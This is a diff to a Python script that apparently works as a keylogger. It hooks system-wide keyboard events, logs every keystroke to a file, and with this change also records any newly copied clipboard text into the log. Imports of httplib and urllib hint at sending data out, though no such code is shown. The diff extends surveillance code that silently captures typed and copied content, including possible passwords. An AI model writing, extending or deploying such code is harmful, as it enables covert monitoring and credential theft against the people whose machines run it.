@@ -1,4 +1,4 @@
-import pyHook, pythoncom, sys, logging,os, httplib, urllib, getpass, shutil, pickle
+import pyHook, pythoncom, sys, logging,os, pyperclip, httplib, urllib, getpass, shutil, pickle
 from datetime import datetime
 
 grph = pickle.load(open("datadict.p","rb"))
@@ -11,6 +11,7 @@ filecheck=False
 filename=""
 conf=False
 sub=[]
+previouscopy=""
 
 def OnKeyboardEvent(event):
     global line_buff
@@ -19,6 +20,7 @@ def OnKeyboardEvent(event):
     global filename
     global conf
     global sub
+    global previouscopy
     
     logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
     ky=event.Ascii
@@ -48,8 +50,11 @@ def OnKeyboardEvent(event):
             os.startfile(sub[int(chr(ky))]+"\\"+filename)
         filename=""
         conf=False
-            
 
+    if((not (pyperclip.paste() == previouscopy)) and (pyperclip.paste() != "")):
+        previouscopy=pyperclip.paste()
+        line_buff+="[Copied data: "+pyperclip.paste()+"]"
+        
         
 #### Check if file/folder name exists and open
             
